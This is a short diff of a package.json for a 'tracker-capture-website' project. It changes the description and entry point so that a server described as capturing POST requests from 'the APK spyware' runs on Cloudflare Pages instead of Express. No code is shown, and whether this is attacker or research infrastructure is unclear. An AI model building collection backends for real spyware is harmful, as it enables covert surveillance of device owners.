@@ -1,13 +1,6 @@
 {
   "name": "tracker-capture-website",
   "version": "1.0.0",
-  "description": "Capture POST requests from the APK spyware",
-  "main": "server.js",
-  "scripts": {
-    "start": "node server.js"
-  },
-  "dependencies": {
-    "express": "^4.18.2",
-    "multer": "^1.4.5-lts.1"
-  }
+  "description": "Capture POST requests from the APK spyware on Cloudflare Pages",
+  "main": "functions/[[path]].js"
 }
